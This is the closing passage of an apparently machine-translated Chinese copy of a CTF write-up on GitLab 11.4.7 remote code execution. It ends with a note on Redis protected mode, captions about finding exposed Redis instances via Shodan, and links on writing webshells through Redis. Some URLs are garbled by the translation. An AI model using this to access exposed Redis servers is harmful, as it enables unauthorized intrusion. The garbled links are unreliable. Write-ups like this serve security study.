l"/></div><figcaption class="my mz gj gh gi na nb bd b be z dk translated">GitLab 11.4.7远程代码执行—真实世界CTF 2018</figcaption></figure><h1 id="2ffa" class="ky kz iq bd la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv bi translated">花絮:Redis保护模式</h1><p id="13c2" class="pw-post-body-paragraph jn jo iq jp b jq mb js jt ju mc jw jx jy md ka kb kc me ke kf kg mf ki kj kk ij bi translated">如果Redis不处于保护模式，Redis实例将暴露在外部网络/互联网上，如果Redis实例不使用身份验证，情况就更糟了，导致人们可以任意访问Redis实例。</p><figure class="kq kr ks kt gt ku gh gi paragraph-image"><div role="button" tabindex="0" class="lx ly di lz bf ma"><div class="gh gi pd"><img src="../Images/0cd35242538c748210ec929c2d22adf3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*WeYdBSa6oTy_QFnF"/></div></div><figcaption class="my mz gj gh gi na nb bd b be z dk translated">在SHODAN搜索暴露的Redis</figcaption></figure><figure class="kq kr ks kt gt ku gh gi paragraph-image"><div class="gh gi pe"><img src="../Images/8ae6f9cebef75882087fe5f0f5f5e9a4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1282/0*J_LZx6xBlSDSDVVi"/></div><figcaption class="my mz gj gh gi na nb bd b be z dk translated">访问公开的Redis实例</figcaption></figure><h1 id="179a" class="ky kz iq bd la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv bi translated">参考</h1><ul class=""><li id="7396" class="mg mh iq jp b jq mb ju mc jy pf kc pg kg ph kk ml mm mn mo bi translated"><a class="ae mw" href="https://www.leavesongs.com/PENETRATION/write-webshell-via-redis-server.html" rel="noopener ugc nofollow" target="_blank">https://www . leave songs . com/PENETRATION/write-webshell-via-redis-server . html</a></li><li id="9a7a" class="mg mh iq jp b jq mp ju mq jy mr kc ms kg mt kk ml mm mn mo bi translated">【http://memaddr.com/rdb-aof-in-redis/ T2】号</li><li id="2cbc" class="mg mh iq jp b jq mp ju mq jy mr kc ms kg mt kk ml mm mn mo bi translated"><a class="ae mw" href="https://raw.githubusercontent.com/antirez/redis/3.2/00-RELEASENOTES" rel="noopener ugc nofollow" target="_blank">https://raw . githubusercontent . com/anti rez/redis/3.2/00-release notes</a></li><li id="c935" class="mg mh iq jp b jq mp ju mq jy mr kc ms kg mt kk ml mm mn mo bi translated"><a class="ae mw" href="http://jkme.github.io/redis-hacker.html" rel="noopener ugc nofollow" target="_blank">http://jkme.github.io/redis-hacker.html</a></li><li id="ff13" class="mg mh iq jp b jq mp ju mq jy mr kc ms kg mt kk ml mm mn mo bi translated"><a class="ae mw" href="https://joychou.org/web/hackredis-enhanced-edition-script.html" rel="noopener ugc nofollow" target="_blank">https://joy Chou . org/web/hackredis-enhanced-edition-script . html</a></li><li id="0197" class="mg mh iq jp b jq mp ju mq jy mr kc ms kg mt kk ml mm mn mo bi translated"><a class="ae mw" href="https://www.agarri.fr/blog/archives/2014/09/11/trying_to_hack_redis_via_http_requests/index.html" rel="noopener ugc nofollow" target="_blank">https://www . agar ri . fr/blog/archives/2014/09/11/trying _ to _ hack _ redis _ via _ http _ requests/index . html</a></li></ul></div></div>    
</body>
</html>